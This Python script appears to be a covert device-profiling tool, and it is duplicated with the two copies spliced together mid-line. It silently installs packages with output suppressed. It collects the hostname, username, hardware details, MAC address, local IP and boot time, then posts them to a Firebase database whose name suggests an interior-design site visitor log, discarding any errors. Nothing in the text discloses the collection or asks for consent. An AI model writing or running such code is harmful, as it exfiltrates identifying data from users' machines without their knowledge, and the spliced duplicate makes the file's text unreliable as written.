import subprocess
import sys
import importlib
import requests
import platform
import socket
import getpass
import uuid
import psutil
import datetime

# ---------- auto install ----------
packages = ["psutil","requests"]

for p in packages:
    try:
        importlib.import_module(p)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", p],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

# ---------- device info ----------
hostname = socket.gethostname()
username = getpass.getuser()

cpu = platform.processor()
cpu_cores = psutil.cpu_count()

ram = round(psutil.virtual_memory().total / (1024**3),2)

disk = []
for p in psutil.disk_partitions():
    try:
        usage = psutil.disk_usage(p.mountpoint)
        disk.append({
            "device":p.device,
            "total_gb":round(usage.total/(1024**3),2)
        })
    except:
        pass

mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
    for ele in range(0,8*6,8)][::-1])

ip = socket.gethostbyname(hostname)

boot = datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat()

data = {
"device_name":hostname,
"user":username,
"cpu":cpu,
"cpu_cores":cpu_cores,
"ram_gb":ram,
"disks":disk,
"os":platform.system(),
"os_version":platform.version(),
"mac":mac,
"local_ip":ip,
"boot_time":boot
}

# ---------- firebase ----------
url="https://interior-design-visitor-default-rtdb.firebaseio.com/devices.json"

try:
    requests.post(url,json=data,timeout=5)
except:
    passimport subprocess
import sys
import importlib
import requests
import platform
import socket
import getpass
import uuid
import psutil
import datetime

# ---------- auto install ----------
packages = ["psutil","requests"]

for p in packages:
    try:
        importlib.import_module(p)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", p],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

# ---------- device info ----------
hostname = socket.gethostname()
username = getpass.getuser()

cpu = platform.processor()
cpu_cores = psutil.cpu_count()

ram = round(psutil.virtual_memory().total / (1024**3),2)

disk = []
for p in psutil.disk_partitions():
    try:
        usage = psutil.disk_usage(p.mountpoint)
        disk.append({
            "device":p.device,
            "total_gb":round(usage.total/(1024**3),2)
        })
    except:
        pass

mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
    for ele in range(0,8*6,8)][::-1])

ip = socket.gethostbyname(hostname)

boot = datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat()

data = {
"device_name":hostname,
"user":username,
"cpu":cpu,
"cpu_cores":cpu_cores,
"ram_gb":ram,
"disks":disk,
"os":platform.system(),
"os_version":platform.version(),
"mac":mac,
"local_ip":ip,
"boot_time":boot
}

# ---------- firebase ----------
url="https://interior-design-visitor-default-rtdb.firebaseio.com/devices.json"

try:
    requests.post(url,json=data,timeout=5)
except:
    pass
